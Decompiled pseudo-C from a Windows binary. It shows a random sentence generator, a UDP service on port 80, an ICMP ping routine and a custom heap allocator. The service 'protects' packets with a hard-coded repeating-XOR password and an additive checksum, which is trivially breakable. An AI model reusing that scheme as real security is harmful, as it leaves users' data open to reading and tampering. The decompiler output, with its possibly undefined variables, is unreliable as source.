//----- (00402F20) --------------------------------------------------------
char *__cdecl sub_402F20(char *a1)
{
  int i; // [esp-2Ch] [ebp-30h]
  int j; // [esp-2Ch] [ebp-30h]
  int v4; // [esp-24h] [ebp-28h]
  int v5; // [esp-24h] [ebp-28h]
  char v6[34]; // [esp-1Eh] [ebp-22h] BYREF

  qmemcpy(v6, &unk_411080, 0x1Eu);
  *(_DWORD *)a1 = 0;
  if ( sub_403680() % 10 + 1 > 4 )
  {
    sub_402CE0((int)v6);
    sub_403780(a1, v6);
    sub_403780(a1, " ");
  }
  v4 = sub_403680() % 2 + 1;
  for ( i = 0; i < v4; ++i )
  {
    sub_402E80((int)v6);
    sub_403780(a1, v6);
    sub_403780(a1, " ");
  }
  sub_402E30((int)v6);
  sub_403780(a1, v6);
  sub_403780(a1, " ");
  if ( sub_403680() % 10 + 1 > 7 )
  {
    sub_402DE0((int)v6);
    sub_403780(a1, v6);
    sub_403780(a1, " ");
  }
  if ( sub_403680() % 10 + 1 > 4 )
  {
    sub_402D80((int)v6);
    sub_403780(a1, v6);
    sub_403780(a1, " ");
  }
  if ( sub_403680() % 10 + 1 > 7 )
  {
    sub_403780(a1, " (");
    v5 = sub_403680() % 2 + 1;
    for ( j = 0; j < v5; ++j )
    {
      sub_402D30((int)v6);
      sub_403780(a1, v6);
      if ( v5 > 1 && j + 1 < v5 )
        sub_403780(a1, ",");
    }
    sub_403780(a1, ")");
  }
  sub_402ED0((int)v6);
  sub_403780(a1, ".");
  return sub_403780(a1, v6);
}

//----- (00403130) --------------------------------------------------------
int __cdecl sub_403130(u_short a1)
{
  struct sockaddr name; // [esp+14h] [ebp-44h] BYREF
  SOCKET s; // [esp+24h] [ebp-34h]
  struct sockaddr from; // [esp+28h] [ebp-30h] BYREF
  int fromlen; // [esp+38h] [ebp-20h] BYREF
  char buf[25]; // [esp+3Fh] [ebp-19h] BYREF

  qmemcpy(buf, &unk_41147C, sizeof(buf));
  sub_404B60(15, (int)sub_4034F0);
  s = 0;
  if ( sub_403500() )
    return 1;
  s = socket(2, 2, 0);
  if ( (s & 0x80000000) != 0 )
    return 2;
  name.sa_family = 2;
  *(_DWORD *)&name.sa_data[2] = htonl(0);
  *(_WORD *)name.sa_data = htons(a1);
  if ( bind(s, &name, 16) >= 0 )
  {
    dword_4159D4 = 0;
    while ( 1 )
    {
      do
      {
        memset(&unk_417094, 0, 0x28u);
        memset(buf, 0, sizeof(buf));
        fromlen = 16;
        recvfrom(s, buf, 25, 0, &from, &fromlen);
        qmemcpy(&unk_417094, buf, 0x18u);
        *((_BYTE *)&unk_417094 + 24) = buf[24];
        sub_403590((int)&unk_417094, (int)aThisisapasswor, dword_4170B4);
      }
      while ( sub_403550(&unk_417094, dword_4159EC) );
      sub_403590((int)&unk_417094, (int)aThisisapasswor, dword_4170B4);
      qmemcpy(buf, &unk_417094, 0x28u);
      sendto(s, buf, 25, 0, &from, fromlen);
    }
  }
  return 3;
}
// 4159D4: using guessed type int dword_4159D4;
// 4159EC: using guessed type int dword_4159EC;
// 4170B4: using guessed type int dword_4170B4;
// 403130: using guessed type char buf[25];

//----- (004032C0) --------------------------------------------------------
int sub_4032C0()
{
  int v0; // ebx

  v0 = -1;
  while ( v0 )
  {
    v0 = sub_403130(0x50u);
    Sleep(0x3E8u);
  }
  return 0;
}

//----- (004032F0) --------------------------------------------------------
int __cdecl sub_4032F0(const char *a1)
{
  int v2; // [esp-1E4h] [ebp-1E8h]
  int v3; // [esp-1E4h] [ebp-1E8h]
  int v4; // [esp-1E4h] [ebp-1E8h]
  struct WSAData v6; // [esp-1E0h] [ebp-1E4h] BYREF
  struct hostent *v7; // [esp-50h] [ebp-54h]
  int v8; // [esp-4Ch] [ebp-50h]
  BOOL (__stdcall *IcmpCloseHandle)(HANDLE); // [esp-48h] [ebp-4Ch]
  HANDLE (__stdcall *IcmpCreateFile)(); // [esp-44h] [ebp-48h]
  HMODULE LibraryA; // [esp-40h] [ebp-44h]
  IPAddr *v12; // [esp-3Ch] [ebp-40h]
  int v13; // [esp-38h] [ebp-3Ch]
  void *v14; // [esp-34h] [ebp-38h]
  DWORD (__stdcall *IcmpSendEcho)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD); // [esp-30h] [ebp-34h]
  unsigned int v16; // [esp-2Ch] [ebp-30h] BYREF
  int v17; // [esp-28h] [ebp-2Ch]
  _DWORD v18[2]; // [esp-24h] [ebp-28h] BYREF
  _DWORD v19[8]; // [esp-1Ch] [ebp-20h] BYREF

  LibraryA = LoadLibraryA("ICMP.DLL");
  if ( !LibraryA )
    return -1;
  IcmpCreateFile = (HANDLE (__stdcall *)())GetProcAddress(LibraryA, "IcmpCreateFile");
  IcmpCloseHandle = (BOOL (__stdcall *)(HANDLE))GetProcAddress(LibraryA, "IcmpCloseHandle");
  IcmpSendEcho = (DWORD (__stdcall *)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD))GetProcAddress(LibraryA, "IcmpSendEcho");
  if ( IcmpCreateFile && IcmpCloseHandle && IcmpSendEcho )
  {
    v8 = WSAStartup(0x101u, &v6);
    if ( !v8
      && v6.wVersion == 257
      && ((v16 = inet_addr(a1), v16 != -1) ? (v7 = gethostbyaddr((const char *)&v16, 4, 2)) : (v7 = gethostbyname(a1)),
          v7) )
    {
      v12 = (IPAddr *)*v7->h_addr_list;
      v14 = (void *)((int (__stdcall *)(int))IcmpCreateFile)(v2);
      v13 = 0;
      v17 = 0;
      do
      {
        v18[0] = 255;
        v18[1] = 0;
        IcmpSendEcho(v14, *v12, 0, 0, (PIP_OPTION_INFORMATION)v18, v19, 28, 5000);
        v16 = v19[0];
        if ( v19[1] )
          break;
        v13 += v19[2];
        ++v17;
        if ( v3 < 2 )
          Sleep(0xC8u);
        v4 = v3 + 1;
      }
      while ( v4 < 3 );
      ((void (__cdecl *)(void *))IcmpCloseHandle)(v14);
      FreeLibrary(LibraryA);
      WSACleanup();
      if ( v17 )
        return v13 / v17;
      else
        return -1;
    }
    else
    {
      WSACleanup();
      FreeLibrary(LibraryA);
      return -1;
    }
  }
  else
  {
    FreeLibrary(LibraryA);
    return -1;
  }
}
// 40341B: variable 'v2' is possibly undefined
// 403487: variable 'v3' is possibly undefined

//----- (004034F0) --------------------------------------------------------
// attributes: thunk
int sub_4034F0()
{
  return WSACleanup();
}

//----- (00403500) --------------------------------------------------------
int sub_403500()
{
  struct WSAData WSAData; // [esp+0h] [ebp-190h] BYREF

  return WSAStartup(2u, &WSAData);
}

//----- (00403520) --------------------------------------------------------
int __cdecl sub_403520(_DWORD *a1, int a2)
{
  int v2; // edx
  int i; // ecx
  int result; // eax

  v2 = a1[1] + *a1;
  for ( i = 0; i < 21; ++i )
  {
    result = *((char *)a1 + i + 8);
    v2 += result;
  }
  a1[9] = a2 ^ v2;
  return result;
}

//----- (00403550) --------------------------------------------------------
int __cdecl sub_403550(_DWORD *a1, int a2)
{
  int v2; // edx
  int i; // ecx

  v2 = a1[1] + *a1;
  for ( i = 0; i < 21; ++i )
    v2 += *((char *)a1 + i + 8);
  if ( a1[9] == (a2 ^ v2) )
    return 0;
  else
    return -1;
}

//----- (00403590) --------------------------------------------------------
int __cdecl sub_403590(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // edi
  int v5; // esi
  int i; // ebx

  result = -1;
  do
    ++result;
  while ( *(_BYTE *)(a2 + result) );
  v4 = result;
  v5 = 0;
  for ( i = 0; i <= a3; ++i )
  {
    result = a1 + i + 8;
    *(_BYTE *)result ^= *(_BYTE *)(a2 + v5++);
    if ( v5 > v4 )
      v5 = 0;
  }
  return result;
}

//----- (00403680) --------------------------------------------------------
int sub_403680()
{
  int i; // ecx
  int j; // ecx
  int v2; // ecx

  if ( !dword_4159F0 )
  {
    for ( i = 0; i < 8; ++i )
      dword_4159F4 = 1664525 * dword_4159F4 + 1013904223;
    for ( j = 0; j < 32; ++j )
    {
      dword_4159F4 = 1664525 * dword_4159F4 + 1013904223;
      dword_416E7C[j] = dword_4159F4;
    }
    dword_4159F8 = dword_416EF8;
    dword_4159F0 = 1;
  }
  dword_4159F4 = 1664525 * dword_4159F4 + 1013904223;
  v2 = dword_4159F8 & 0x1F;
  dword_4159F8 = dword_416E7C[v2];
  dword_416E7C[v2] = dword_4159F4;
  return dword_4159F8 & 0x3FFFFFFF;
}
// 4159F0: using guessed type int dword_4159F0;
// 4159F4: using guessed type int dword_4159F4;
// 4159F8: using guessed type int dword_4159F8;
// 416E7C: using guessed type int dword_416E7C[31];
// 416EF8: using guessed type int dword_416EF8;

//----- (00403730) --------------------------------------------------------
int __cdecl sub_403730(_BYTE *a1, unsigned __int8 *a2, int a3)
{
  while ( a3 )
  {
    if ( (unsigned __int8)*a1 != *a2 )
      return (unsigned __int8)*a1 < (int)*a2 ? -1 : 1;
    if ( !*a1 )
      return 0;
    ++a1;
    ++a2;
    --a3;
  }
  return 0;
}

//----- (00403780) --------------------------------------------------------
char *__cdecl sub_403780(char *a1, char *a2)
{
  char *i; // ecx
  char v4; // al

  for ( i = a1; *i; ++i )
    ;
  while ( 1 )
  {
    v4 = *a2;
    *i = *a2;
    if ( !v4 )
      break;
    ++i;
    ++a2;
  }
  return a1;
}

//----- (004037B0) --------------------------------------------------------
int __cdecl sub_4037B0(int a1)
{
  unsigned int v1; // esi
  unsigned int v2; // edi
  char *v3; // eax
  int result; // eax
  _DWORD *v5; // ebx
  unsigned int *v6; // ebx
  unsigned int v7; // esi
  unsigned int v8; // esi
  unsigned int *v9; // ebx
  int v10; // eax
  int v11; // eax
  unsigned int v12; // kr00_4
  char *v13; // ebx
  int v14; // [esp-20h] [ebp-24h]
  int v15; // [esp-1Ch] [ebp-20h]
  int v16; // [esp-10h] [ebp-14h]
  int v17; // [esp-Ch] [ebp-10h]
  unsigned int v18; // [esp-4h] [ebp-8h]

  v1 = ((unsigned int)(a1 + 3) >> 14 << 14) + 0x4000;
  v2 = 4 * v1;
  v3 = sub_404D40(4 * v1);
  if ( v3 )
  {
    if ( (char *)(dword_416EFC + dword_416F00) == v3 )
    {
      v5 = (_DWORD *)dword_416EFC;
      v2 += dword_416F00;
      v1 = v2 >> 2;
    }
    else
    {
      v5 = v3;
    }
    dword_416EFC = (int)&v5[v1];
    dword_416F00 = v2 - 4 * v1;
    if ( v5 == (_DWORD *)(dword_415A20 + 4) && dword_415A28 )
    {
      v13 = (char *)(v5 - 1);
      v18 = v1 + (*(_DWORD *)v13 & 0x7FFFFFFF);
      *(_DWORD *)v13 = v1 | 0x80000000;
      dword_415A20 += 4 * v1;
      *(_DWORD *)(dword_415A20 - 4) = *(_DWORD *)v13;
      *(_DWORD *)dword_415A20 = v18 | 0x80000000;
      *(_DWORD *)(dword_415A20 - 4 * v18 + 4) = v18 | 0x80000000;
      sub_404670(v13 + 4);
      return 1;
    }
    else
    {
      v17 = dword_415A28;
      dword_415A28 = (int)v5;
      *v5 = v17;
      v6 = v5 + 1;
      v7 = v1 - 1;
      dword_415A20 = (int)v6;
      if ( !dword_415A24 || dword_415A24 > (unsigned int)v6 )
        dword_415A24 = (int)v6;
      *v6 = v7 | 0x80000000;
      dword_415A20 = dword_415A20 + 4 * v7 - 4;
      *(_DWORD *)dword_415A20 = v7 | 0x80000000;
      v8 = v7 - 2;
      v9 = (unsigned int *)(dword_415A20 - 4);
      if ( v8 > dword_415A38 )
      {
        if ( v8 > dword_415A40 )
          v11 = (v8 > dword_415A44) + 6;
        else
          v11 = (v8 > dword_415A3C) + 4;
        v16 = v11;
      }
      else
      {
        if ( v8 > dword_415A30 )
          v10 = (v8 > dword_415A34) + 2;
        else
          v10 = v8 > dword_415A2C;
        v16 = v10;
      }
      dword_415A50 = v16;
      v14 = dword_4159FC[v16];
      if ( v14 )
      {
        v15 = *(_DWORD *)(v14 - 8);
      }
      else
      {
        v15 = dword_415A20 - 4;
        v14 = dword_415A20 - 4;
        dword_4159FC[dword_415A50] = (int)v9;
        if ( dword_415A4C > dword_415A50 )
          dword_415A4C = dword_415A50;
      }
      *(v9 - 1) = v14;
      *(_DWORD *)(v14 - 8) = v9;
      *(_DWORD *)(v15 - 4) = v9;
      *(v9 - 2) = v15;
      v9[-v8 + 1] = v8;
      *v9 = v8;
      dword_4159FC[dword_415A50] = (int)v9;
      while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
        ++dword_415A4C;
      v12 = __readeflags();
      result = 1;
      __writeeflags(v12);
    }
  }
  else
  {
    dword_415BD0 = 0;
    return 0;
  }
  return result;
}
// 4159FC: using guessed type int dword_4159FC[9];
// 415A20: using guessed type int dword_415A20;
// 415A24: using guessed type int dword_415A24;
// 415A28: using guessed type int dword_415A28;
// 415A2C: using guessed type int dword_415A2C;
// 415A30: using guessed type int dword_415A30;
// 415A34: using guessed type int dword_415A34;
// 415A38: using guessed type int dword_415A38;
// 415A3C: using guessed type int dword_415A3C;
// 415A40: using guessed type int dword_415A40;
// 415A44: using guessed type int dword_415A44;
// 415A4C: using guessed type int dword_415A4C;
// 415A50: using guessed type int dword_415A50;
// 415BD0: using guessed type int dword_415BD0;
// 416EFC: using guessed type int dword_416EFC;
// 416F00: using guessed type int dword_416F00;

//----- (00403A50) --------------------------------------------------------
int __cdecl sub_403A50(int a1)
{
  unsigned int *v1; // ebx
  unsigned int v2; // esi
  unsigned int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int result; // eax
  int v8; // eax
  int v9; // eax
  int v10; // [esp-34h] [ebp-38h]
  int v11; // [esp-34h] [ebp-38h]
  unsigned int *v12; // [esp-30h] [ebp-34h]
  unsigned int *v13; // [esp-30h] [ebp-34h]
  int v14; // [esp-28h] [ebp-2Ch]
  int v15; // [esp-24h] [ebp-28h]
  unsigned int *v16; // [esp-24h] [ebp-28h]
  unsigned int v17; // [esp-1Ch] [ebp-20h]
  int v18; // [esp-10h] [ebp-14h]
  int v19; // [esp-Ch] [ebp-10h]
  unsigned int *v20; // [esp-8h] [ebp-Ch]
  unsigned int *v21; // [esp-4h] [ebp-8h]

  v1 = 0;
  v2 = ((unsigned int)(a1 + 3) >> 2) + 2;
  if ( v2 < 4 )
    v2 = 4;
  v3 = 0;
  if ( v2 > dword_415A38 )
  {
    if ( v2 > dword_415A40 )
      v5 = (v2 > dword_415A44) + 6;
    else
      v5 = (v2 > dword_415A3C) + 4;
    v18 = v5;
  }
  else
  {
    if ( v2 > dword_415A30 )
      v4 = (v2 > dword_415A34) + 2;
    else
      v4 = v2 > dword_415A2C;
    v18 = v4;
  }
  v19 = v18;
  if ( v18 < dword_415A4C )
    v19 = dword_415A4C;
  while ( v3 < v2 && v19 < 8 )
  {
    v6 = v19++;
    v1 = (unsigned int *)dword_4159FC[v6];
    if ( v1 )
    {
      if ( v1 == (unsigned int *)(dword_415A20 - 4) )
        v1 = (unsigned int *)*(v1 - 1);
      v21 = v1;
      do
      {
        v3 = *v1;
        if ( *v1 >= v2 )
          break;
        v1 = (unsigned int *)*(v1 - 1);
      }
      while ( v1 != v21 );
    }
  }
  if ( v3 >= v2 )
  {
    if ( v19 > 0 )
      --v19;
  }
  else
  {
    result = sub_4037B0(v2);
    if ( !result )
      return result;
    v19 = dword_415A50;
    v1 = (unsigned int *)dword_4159FC[dword_415A50];
    v3 = *v1;
  }
  v17 = v3 - v2;
  if ( v3 - v2 < 4 )
  {
    v16 = (unsigned int *)*(v1 - 1);
    if ( v1 == v16 )
    {
      dword_4159FC[v19] = 0;
      if ( dword_415A4C == v19 )
      {
        while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
          ++dword_415A4C;
      }
    }
    else
    {
      v14 = *(v1 - 2);
      *(_DWORD *)(v14 - 4) = v16;
      *(v16 - 2) = v14;
      if ( v1 == (unsigned int *)dword_4159FC[v19] )
        dword_4159FC[v19] = v14;
    }
    v2 = v3;
  }
  else
  {
    if ( v17 > dword_415A38 )
    {
      if ( v17 > dword_415A40 )
        v9 = (v17 > dword_415A44) + 6;
      else
        v9 = (v17 > dword_415A3C) + 4;
      v15 = v9;
    }
    else
    {
      if ( v17 > dword_415A30 )
        v8 = (v17 > dword_415A34) + 2;
      else
        v8 = v17 > dword_415A2C;
      v15 = v8;
    }
    if ( v15 == v19 )
    {
      v1[-v17 + 1] = v17;
      *v1 = v17;
    }
    else
    {
      v12 = (unsigned int *)*(v1 - 1);
      if ( v1 == v12 )
      {
        dword_4159FC[v19] = 0;
        if ( dword_415A4C == v19 )
        {
          while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
            ++dword_415A4C;
        }
      }
      else
      {
        v10 = *(v1 - 2);
        *(_DWORD *)(v10 - 4) = v12;
        *(v12 - 2) = v10;
        if ( v1 == (unsigned int *)dword_4159FC[v19] )
          dword_4159FC[v19] = v10;
      }
      v11 = dword_4159FC[v15];
      if ( v11 )
      {
        v13 = *(unsigned int **)(v11 - 8);
      }
      else
      {
        v13 = v1;
        v11 = (int)v1;
        dword_4159FC[v15] = (int)v1;
        if ( dword_415A4C > v15 )
          dword_415A4C = v15;
      }
      *(v1 - 1) = v11;
      *(_DWORD *)(v11 - 8) = v1;
      *(v13 - 1) = (unsigned int)v1;
      *(v1 - 2) = (unsigned int)v13;
      v1[-v17 + 1] = v17;
      *v1 = v17;
    }
  }
  v20 = &v1[-v3 + 1];
  v20[v2 - 1] = v2 | 0x80000000;
  *v20 = v2 | 0x80000000;
  return (int)&v1[-v3 + 2];
}
// 4159FC: using guessed type int dword_4159FC[9];
// 415A20: using guessed type int dword_415A20;
// 415A2C: using guessed type int dword_415A2C;
// 415A30: using guessed type int dword_415A30;
// 415A34: using guessed type int dword_415A34;
// 415A38: using guessed type int dword_415A38;
// 415A3C: using guessed type int dword_415A3C;
// 415A40: using guessed type int dword_415A40;
// 415A44: using guessed type int dword_415A44;
// 415A4C: using guessed type int dword_415A4C;
// 415A50: using guessed type int dword_415A50;

//----- (00403DC0) --------------------------------------------------------
LPVOID __cdecl sub_403DC0(SIZE_T dwBytes)
{
  LPVOID v1; // esi

  v1 = 0;
  if ( dwBytes < dword_415BD0 )
    v1 = (LPVOID)sub_403A50(dwBytes);
  if ( !v1 )
    v1 = sub_404E30(dwBytes);
  if ( !v1 )
    dword_415C84 = 12;
  return v1;
}
// 415BD0: using guessed type int dword_415BD0;
// 415C84: using guessed type int dword_415C84;

//----- (00403E00) --------------------------------------------------------
char *__cdecl sub_403E00(char *lpMem, SIZE_T dwBytes)
{
  SIZE_T v2; // edi
  unsigned int *v3; // ebx
  unsigned int *v5; // ebx
  int *v6; // esi
  SIZE_T v7; // edi
  _BYTE *v8; // eax
  unsigned int *v9; // esi
  int v10; // eax
  int v11; // eax
  int v12; // [esp+Ch] [ebp-34h]
  int v13; // [esp+Ch] [ebp-34h]
  unsigned int *v14; // [esp+10h] [ebp-30h]
  unsigned int *v15; // [esp+10h] [ebp-30h]
  int v16; // [esp+18h] [ebp-28h]
  int v17; // [esp+18h] [ebp-28h]
  int v18; // [esp+1Ch] [ebp-24h]
  unsigned int *v19; // [esp+1Ch] [ebp-24h]
  unsigned int v20; // [esp+24h] [ebp-1Ch]
  int v21; // [esp+2Ch] [ebp-14h]
  unsigned int v22; // [esp+30h] [ebp-10h]
  int v23; // [esp+30h] [ebp-10h]
  _BYTE *v24; // [esp+34h] [ebp-Ch]
  unsigned int v25; // [esp+3Ch] [ebp-4h]
  SIZE_T v26; // [esp+3Ch] [ebp-4h]

  v2 = ((dwBytes + 3) >> 2) + 2;
  if ( v2 < 4 )
    v2 = 4;
  v3 = (unsigned int *)(lpMem - 4);
  if ( *((int *)lpMem - 1) < 0 )
  {
    v25 = *v3 & 0x7FFFFFFF;
    if ( v25 < v2 )
    {
      v6 = (int *)&v3[*v3];
      v7 = v2 - v25;
      if ( *v6 >= 0 && *v6 >= v7 )
      {
        v9 = (unsigned int *)&v6[*v6 - 1];
        if ( *v9 > dword_415A38 )
        {
          if ( *v9 > dword_415A40 )
            v10 = (*v9 > dword_415A44) + 6;
          else
            v10 = (*v9 > dword_415A3C) + 4;
          v23 = v10;
        }
        else
        {
          if ( *v9 > dword_415A30 )
            v21 = (*v9 > dword_415A34) + 2;
          else
            v21 = *v9 > dword_415A2C;
          v23 = v21;
        }
        v20 = *v9 - v7;
        if ( v20 < 4 )
        {
          v19 = (unsigned int *)*(v9 - 1);
          if ( v9 == v19 )
          {
            dword_4159FC[v23] = 0;
            if ( dword_415A4C == v23 )
            {
              while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
                ++dword_415A4C;
            }
          }
          else
          {
            v17 = *(v9 - 2);
            *(_DWORD *)(v17 - 4) = v19;
            *(v19 - 2) = v17;
            if ( v9 == (unsigned int *)dword_4159FC[v23] )
              dword_4159FC[v23] = v17;
          }
          v7 = *v9;
        }
        else
        {
          if ( v20 > dword_415A38 )
          {
            if ( v20 > dword_415A40 )
              v11 = (v20 > dword_415A44) + 6;
            else
              v11 = (v20 > dword_415A3C) + 4;
            v18 = v11;
          }
          else
          {
            if ( v20 > dword_415A30 )
              v16 = (v20 > dword_415A34) + 2;
            else
              v16 = v20 > dword_415A2C;
            v18 = v16;
          }
          if ( v18 == v23 )
          {
            v9[-v20 + 1] = v20;
            *v9 = v20;
          }
          else
          {
            v14 = (unsigned int *)*(v9 - 1);
            if ( v9 == v14 )
            {
              dword_4159FC[v23] = 0;
              if ( dword_415A4C == v23 )
              {
                while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
                  ++dword_415A4C;
              }
            }
            else
            {
              v12 = *(v9 - 2);
              *(_DWORD *)(v12 - 4) = v14;
              *(v14 - 2) = v12;
              if ( v9 == (unsigned int *)dword_4159FC[v23] )
                dword_4159FC[v23] = v12;
            }
            v13 = dword_4159FC[v18];
            if ( v13 )
            {
              v15 = *(unsigned int **)(v13 - 8);
            }
            else
            {
              v15 = v9;
              v13 = (int)v9;
              dword_4159FC[v18] = (int)v9;
              if ( dword_415A4C > v18 )
                dword_415A4C = v18;
            }
            *(v9 - 1) = v13;
            *(_DWORD *)(v13 - 8) = v9;
            *(v15 - 1) = (unsigned int)v9;
            *(v9 - 2) = (unsigned int)v15;
            v9[-v20 + 1] = v20;
            *v9 = v20;
          }
        }
        v26 = v7 + v25;
        v3[v26 - 1] = v26 | 0x80000000;
        *v3 = v26 | 0x80000000;
        return lpMem;
      }
      else
      {
        v8 = sub_403DC0(dwBytes);
        v24 = v8;
        if ( v8 )
        {
          sub_404EE0(v8, lpMem, 4 * *v3 - 8);
          sub_404670(lpMem);
        }
        return v24;
      }
    }
    else
    {
      v22 = v25 - v2;
      if ( v25 - v2 >= 4 )
      {
        *v3 = v2 | 0x80000000;
        v3[v2 - 1] = v2 | 0x80000000;
        v5 = &v3[v2];
        *v5 = v22 | 0x80000000;
        v5[v22 - 1] = v22 | 0x80000000;
        sub_404670((char *)v5 + 4);
      }
      return lpMem;
    }
  }
  else
  {
    dword_415C84 = 22;
    return 0;
  }
}
// 4159FC: using guessed type int dword_4159FC[9];
// 415A2C: using guessed type int dword_415A2C;
// 415A30: using guessed type int dword_415A30;
// 415A34: using guessed type int dword_415A34;
// 415A38: using guessed type int dword_415A38;
// 415A3C: using guessed type int dword_415A3C;
// 415A40: using guessed type int dword_415A40;
// 415A44: using guessed type int dword_415A44;
// 415A4C: using guessed type int dword_415A4C;
// 415C84: using guessed type int dword_415C84;

//----- (004041B0) --------------------------------------------------------
_BYTE *__cdecl sub_4041B0(char *lpMem, SIZE_T dwBytes)
{
  _BYTE *v3; // edi
  SIZE_T v4; // [esp+Ch] [ebp-4h]
  unsigned int v5; // [esp+Ch] [ebp-4h]

  if ( !lpMem )
    return sub_403DC0(dwBytes);
  if ( dwBytes )
  {
    v3 = 0;
    if ( (unsigned int)(lpMem - 4) <= dword_415A24 || (unsigned int)(lpMem - 4) >= dword_415A20 )
    {
      if ( dwBytes < dword_415BD0 )
      {
        v3 = (_BYTE *)sub_403A50(dwBytes);
        if ( v3 )
        {
          v5 = sub_404E90(lpMem);
          if ( v5 > dwBytes )
            v5 = dwBytes;
          sub_404EE0(v3, lpMem, v5);
          sub_404E70(lpMem);
        }
      }
      if ( !v3 )
        v3 = sub_404E50(lpMem, dwBytes);
    }
    else
    {
      if ( dwBytes < dword_415BD0 )
        v3 = sub_403E00(lpMem, dwBytes);
      if ( !v3 )
      {
        v3 = sub_404E30(dwBytes);
        if ( v3 )
        {
          v4 = sub_404F00((int)lpMem);
          if ( v4 > dwBytes )
            v4 = dwBytes;
          sub_404EE0(v3, lpMem, v4);
          sub_4042C0((int)lpMem);
        }
      }
    }
    if ( !v3 )
      dword_415C84 = 12;
    return v3;
  }
  else
  {
    sub_404670(lpMem);
    return 0;
  }
}
// 415A20: using guessed type int dword_415A20;
// 415A24: using guessed type int dword_415A24;
// 415BD0: using guessed type int dword_415BD0;
// 415C84: using guessed type int dword_415C84;

//----- (004042C0) --------------------------------------------------------
unsigned int __cdecl sub_4042C0(int a1)
{
  _DWORD *v1; // ebx
  unsigned int result; // eax
  unsigned int v3; // ecx
  unsigned int *v4; // ebx
  unsigned int *v5; // esi
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // [esp+8h] [ebp-20h]
  int v10; // [esp+8h] [ebp-20h]
  int v11; // [esp+8h] [ebp-20h]
  int *v12; // [esp+Ch] [ebp-1Ch]
  unsigned int *v13; // [esp+Ch] [ebp-1Ch]
  unsigned int *v14; // [esp+Ch] [ebp-1Ch]
  int v15; // [esp+14h] [ebp-14h]
  int v16; // [esp+14h] [ebp-14h]
  int v17; // [esp+14h] [ebp-14h]
  int v18; // [esp+18h] [ebp-10h]
  int v19; // [esp+18h] [ebp-10h]
  int v20; // [esp+18h] [ebp-10h]
  int v21; // [esp+1Ch] [ebp-Ch]
  int *v22; // [esp+24h] [ebp-4h]

  v21 = -1;
  v1 = (_DWORD *)(a1 - 4);
  result = *(_DWORD *)(a1 - 4) & 0x80000000;
  if ( *(int *)(a1 - 4) < 0 )
  {
    v3 = *v1 & 0x7FFFFFFF;
    v22 = (int *)(a1 - 8);
    v4 = &v1[*v1 - 1];
    if ( (v4[1] & 0x80000000) == 0 )
    {
      v5 = &v4[v4[1]];
      if ( *v5 > dword_415A38 )
      {
        if ( *v5 > dword_415A40 )
          v6 = (*v5 > dword_415A44) + 6;
        else
          v6 = (*v5 > dword_415A3C) + 4;
        v18 = v6;
      }
      else
      {
        if ( *v5 > dword_415A30 )
          v15 = (*v5 > dword_415A34) + 2;
        else
          v15 = *v5 > dword_415A2C;
        v18 = v15;
      }
      v21 = v18;
      v3 += *v5;
      *v5 = v3;
      v5[-v3 + 1] = v3;
      v4 = v5;
    }
    if ( *v22 >= 0 )
    {
      v3 += *v22;
      if ( *v22 > (unsigned int)dword_415A38 )
      {
        if ( *v22 > (unsigned int)dword_415A40 )
          v7 = (*v22 > (unsigned int)dword_415A44) + 6;
        else
          v7 = (*v22 > (unsigned int)dword_415A3C) + 4;
        v19 = v7;
      }
      else
      {
        if ( *v22 > (unsigned int)dword_415A30 )
          v16 = (*v22 > (unsigned int)dword_415A34) + 2;
        else
          v16 = *v22 > (unsigned int)dword_415A2C;
        v19 = v16;
      }
      v12 = *(int **)(a1 - 12);
      if ( v22 == v12 )
      {
        dword_4159FC[v19] = 0;
        if ( dword_415A4C == v19 )
        {
          while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
            ++dword_415A4C;
        }
      }
      else
      {
        v9 = *(_DWORD *)(a1 - 16);
        *(_DWORD *)(v9 - 4) = v12;
        *(v12 - 2) = v9;
        if ( v22 == (int *)dword_4159FC[v19] )
          dword_4159FC[v19] = v9;
      }
      *v4 = v3;
      v4[-v3 + 1] = v3;
    }
    if ( v3 > dword_415A38 )
    {
      if ( v3 > dword_415A40 )
        v8 = (v3 > dword_415A44) + 6;
      else
        v8 = (v3 > dword_415A3C) + 4;
      v20 = v8;
    }
    else
    {
      if ( v3 > dword_415A30 )
        v17 = (v3 > dword_415A34) + 2;
      else
        v17 = v3 > dword_415A2C;
      v20 = v17;
    }
    result = v20;
    if ( v21 != v20 )
    {
      if ( v21 >= 0 )
      {
        v13 = (unsigned int *)*(v4 - 1);
        if ( v4 == v13 )
        {
          dword_4159FC[v21] = 0;
          if ( dword_415A4C == v21 )
          {
            while ( !dword_4159FC[dword_415A4C] && dword_415A4C < 7 )
              ++dword_415A4C;
          }
        }
        else
        {
          v10 = *(v4 - 2);
          *(_DWORD *)(v10 - 4) = v13;
          *(v13 - 2) = v10;
          if ( v4 == (unsigned int *)dword_4159FC[v21] )
            dword_4159FC[v21] = v10;
        }
      }
      v11 = dword_4159FC[v20];
      if ( v11 )
      {
        v14 = *(unsigned int **)(v11 - 8);
      }
      else
      {
        v14 = v4;
        v11 = (int)v4;
        dword_4159FC[v20] = (int)v4;
        if ( dword_415A4C > v20 )
          dword_415A4C = v20;
      }
      *(v4 - 1) = v11;
      *(_DWORD *)(v11 - 8) = v4;
      *(v14 - 1) = (unsigned int)v4;
      *(v4 - 2) = (unsigned int)v14;
      v4[-v3 + 1] = v3;
      *v4 = v3;
      result = v20;
      dword_415A50 = v20;
      dword_4159FC[v20] = (int)v4;
    }
  }
  else
  {
    dword_415C84 = 22;
  }
  return result;
}
// 4159FC: using guessed type int dword_4159FC[9];
// 415A2C: using guessed type int dword_415A2C;
// 415A30: using guessed type int dword_415A30;
// 415A34: using guessed type int dword_415A34;
// 415A38: using guessed type int dword_415A38;
// 415A3C: using guessed type int dword_415A3C;
// 415A40: using guessed type int dword_415A40;
// 415A44: using guessed type int dword_415A44;
// 415A4C: using guessed type int dword_415A4C;
// 415A50: using guessed type int dword_415A50;
